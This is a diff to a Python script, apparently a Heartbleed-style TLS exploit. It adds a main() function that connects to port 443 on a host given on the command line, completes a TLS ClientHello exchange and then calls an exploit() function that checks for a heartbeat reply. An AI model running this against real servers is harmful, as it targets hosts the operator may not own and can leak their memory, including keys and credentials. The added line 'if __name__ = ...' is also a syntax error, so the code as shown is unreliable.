@@ -75,3 +75,16 @@ def exploit(socket):
 	else:
 		print("No heartbeat received")
 	socket.close()
+
+def main():
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((sys.argv[1], 443)) # connecting to the IP address that was passed as a command line argument
+	s.send(array.array('B', clientHello)) # TLS v1.2 Connection Initiation
+	serverHelloDone = False
+	while not serverHelloDone: # Listening to reply messages, checking their type
+		type, version, payload, msgType = readPackets(s)
+		if (msgType == SERVER_HELLO_DONE):
+			serverHelloDone = True
+	exploit(s) # calling the exploit() function
+if __name__ = '__main__':
+	main()
